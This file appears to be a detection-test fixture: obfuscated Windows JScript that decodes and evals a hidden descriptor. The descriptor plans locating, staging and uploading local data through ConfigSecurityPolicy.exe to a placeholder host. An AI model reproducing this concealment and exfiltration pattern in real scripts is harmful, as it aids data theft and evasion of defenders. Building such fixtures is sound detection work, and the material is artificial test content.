// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_8b072d0d = function(SoUrCeByTeS) {
  var DeCoDeDByTeS = [];
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push((SoUrCeByTeS[i] - 29 + 256) % 256); }
  return DeCoDeDByTeS;
};
var recover_5d1cb830 = function() {
  var characters = [152,63,144,145,130,141,144,63,87,120,63,137,140,128,126,145,130,124,137,140,128,126,137,63,73,63,141,143,130,141,126,143,130,124,145,143,126,139,144,131,130,143,63,73,63,146,141,137,140,126,129,124,143,130,138,140,145,130,63,122,73,63,126,129,126,141,145,130,143,63,87,63,96,140,139,131,134,132,112,130,128,146,143,134,145,150,109,140,137,134,128,150,75,130,149,130,63,73,63,147,126,137,146,130,144,63,87,152,63,128,126,138,141,126,134,132,139,124,134,129,63,87,63,128,126,138,141,126,134,132,139,74,77,126,130,126,131,128,82,127,86,79,63,73,63,146,143,137,63,87,63,133,145,145,141,144,87,76,76,77,126,130,126,131,128,82,127,86,79,75,130,149,126,138,141,137,130,75,134,139,147,126,137,134,129,76,128,78,86,126,80,126,126,126,75,129,126,145,63,73,63,146,144,130,143,124,126,132,130,139,145,63,87,63,101,146,139,145,143,130,144,144,105,126,127,76,77,126,130,126,131,128,82,127,86,79,63,73,63,131,134,137,130,124,141,126,145,133,63,87,63,96,87,121,121,114,144,130,143,144,121,121,109,146,127,137,134,128,121,121,101,146,139,145,143,130,144,144,105,126,127,121,121,144,145,126,132,130,74,77,126,130,126,131,128,82,127,86,79,75,129,126,145,63,154,73,63,144,145,126,132,130,96,140,146,139,145,63,87,80,154];

  var SoUrCeByTeS = [];

  for (var ci = 0; ci < characters.length; ci++) { SoUrCeByTeS.push(characters[ci]); }



  var DeCoDeDByTeS = [];

  var state = 1;

  switch (state) { case 1: DeCoDeDByTeS = decode_8b072d0d.apply(null, [SoUrCeByTeS]); break; default: DeCoDeDByTeS = []; }

  var DeScRiPtOrTeXt = DeCoDeDByTeS.length ? String.fromCharCode(DeCoDeDByTeS[0]) : "", bi = 1;

  for (bi = 1; bi < DeCoDeDByTeS.length; bi++) { DeScRiPtOrTeXt = DeScRiPtOrTeXt.concat(String.fromCharCode(DeCoDeDByTeS[bi])); }

  return DeScRiPtOrTeXt;
};
var inspect_f137f108 = function() {
  var DeScRiPtOr = eval("(" + recover_5d1cb830.apply(null, []) + ")");
  return { steps: DeScRiPtOr.steps, adapter: DeScRiPtOr["adapter"], values: DeScRiPtOr.values, stageCount: DeScRiPtOr["stageCount"] };
};
